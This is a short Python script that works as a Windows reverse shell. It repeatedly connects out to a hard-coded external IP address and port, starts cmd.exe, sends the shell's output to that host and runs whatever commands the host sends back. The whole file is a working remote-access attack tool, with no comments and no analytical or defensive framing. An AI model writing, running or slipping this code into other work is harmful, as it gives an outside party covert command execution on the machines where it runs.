from socket import *
import subprocess
import os, threading
import time

def send(talk, proc):
        import time
        while True:
                msg = proc.stdout.readline()
                talk.send(msg)

if __name__ == "__main__":
        server=socket(AF_INET,SOCK_STREAM)
        while 1>0:
                try:
                        server.connect(('23.83.249.21',2333))
                        server.send('shellcoming\n')
                        break
                except:
                       time.sleep(10)
        talk=server
        proc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        t = threading.Thread(target = send, args = (talk, proc))
        t.setDaemon(True)
        t.start()
        while True:
                cmd=talk.recv(1024)
                proc.stdin.write(cmd)
                proc.stdin.flush()
        server.close